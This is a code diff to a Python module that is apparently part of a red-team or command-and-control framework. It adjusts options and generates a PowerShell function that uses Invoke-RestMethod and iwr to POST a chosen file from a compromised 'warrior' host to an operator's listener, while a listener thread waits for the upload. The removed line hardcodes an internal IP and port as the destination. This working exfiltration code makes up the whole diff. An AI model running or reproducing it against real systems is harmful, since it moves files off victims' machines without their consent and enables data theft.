@@ -50,7 +50,7 @@ class CustomModule(Module):
         # -----------name-----default_value--description--required?
         options = {"warrior": [None, "Warrior in war", True],
                     "source": [None, "Source file to be transferred", True],
-                    "uri": [None, "Local IP", True],
+                    "ip": [None, "Local IP", True],
                     "port": ["9999", "Listener port", True],
                    "interface": ["0.0.0.0", "Listener address", True],
                    "file": ["/tmp/", "Path to save the file", True] }
@@ -69,14 +69,14 @@ class CustomModule(Module):
                             [Parameter(Mandatory)]
                             [string] $uri
                         )
-                            Invoke-RestMethod -Uri "10.95.253.174:9999" -Method Post -InFile $source
+                            Invoke-RestMethod -Uri $uri -Method Post -InFile $source
                             iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results='TheEnd'}
                             return "Done"
                     }
             """
 
 
-        function += 'download-file -source ' + self.args["source"] + ' -uri http://' + self.args["uri"] + ':'+ self.args["port"]
+        function += 'download-file -source ' + self.args["source"] + ' -uri http://' + self.args["ip"] + ':'+ self.args["port"]
         listener = Thread(target=self.run, kwargs={'address':self.args["interface"], 'port':int(self.args["port"])})
         listener.start()
         super(CustomModule, self).run(function)
